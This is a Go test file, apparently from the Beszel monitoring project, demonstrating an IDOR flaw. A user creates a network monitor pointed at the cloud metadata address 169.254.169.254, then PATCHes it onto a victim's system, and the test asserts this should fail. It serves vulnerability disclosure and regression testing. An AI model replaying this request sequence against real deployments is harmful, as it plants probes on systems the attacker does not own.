//go:build testing

package alerts_test

import (
	"net/http/httptest"
	"testing"

	beszelTests "github.com/henrygd/beszel/internal/tests"
	"github.com/pocketbase/dbx"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestNetworkMonitorSystemAccessIDOR_PoC demonstrates that the network_monitors
// collection is missing the `@request.body.system:changed = false` guard that the
// alerts collection has. An authenticated non-readonly user who owns system A can
// create a monitor on A, then PATCH its `system` to a VICTIM's system B that the
// attacker does not own. The update rule only checks the *stored* system (A), so
// the reassignment succeeds and a monitor ends up on the victim's system B.
func TestNetworkMonitorSystemAccessIDOR_PoC(t *testing.T) {
	t.Setenv("BESZEL_HUB_SHARE_ALL_SYSTEMS", "false")
	hub, err := beszelTests.NewTestHub(t.TempDir())
	require.NoError(t, err)
	defer hub.Cleanup()
	hub.StartHub()

	attacker, err := beszelTests.CreateUser(hub, "attacker@example.com", "password")
	require.NoError(t, err)
	victim, err := beszelTests.CreateUser(hub, "victim@example.com", "password")
	require.NoError(t, err)
	token, err := attacker.NewAuthToken()
	require.NoError(t, err)

	own, err := beszelTests.CreateSystems(hub, 1, attacker.Id, "paused")
	require.NoError(t, err)
	foreign, err := beszelTests.CreateSystems(hub, 1, victim.Id, "paused")
	require.NoError(t, err)

	handler := alertAPIRouter(t, hub)
	const records = "/api/collections/network_monitors/records"

	// 1) attacker creates a monitor on their OWN system (allowed)
	created := alertAPIRequest(t, handler, token, "POST", records, map[string]any{
		"system": own[0].Id, "target": "169.254.169.254", "protocol": "tcp",
		"port": 80, "interval": 60, "enabled": true,
	}, 200)
	id, _ := created["id"].(string)
	require.NotEmpty(t, id, "monitor should be created on attacker's own system")
	t.Logf("attacker created monitor %s on own system %s", id, own[0].Id)

	// 2) attacker reassigns the monitor to the VICTIM's system (raw request; status may vary)
	req := httptest.NewRequest("PATCH", records+"/"+id, jsonReader(map[string]any{"system": foreign[0].Id}))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", token)
	res := httptest.NewRecorder()
	handler.ServeHTTP(res, req)
	t.Logf("PATCH {system: victimSystem} -> HTTP %d: %s", res.Code, res.Body.String())

	// 3) definitive check: did a monitor land on the victim's system?
	foreignMons, err := hub.FindAllRecords("network_monitors", dbx.HashExp{"system": foreign[0].Id})
	require.NoError(t, err)
	if len(foreignMons) > 0 {
		t.Logf(">>> IDOR CONFIRMED: attacker placed a monitor on victim system %s (target=%q protocol=%q port=%v) — attacker is NOT a member of that system",
			foreign[0].Id, foreignMons[0].GetString("target"), foreignMons[0].GetString("protocol"), foreignMons[0].GetInt("port"))
	}

	// Secure expectation (mirrors the alerts collection, whose system is immutable):
	// the attacker must NOT be able to place a monitor on a system they do not own.
	assert.Len(t, foreignMons, 0, "SECURE EXPECTATION: no monitor should exist on the victim's system")
}
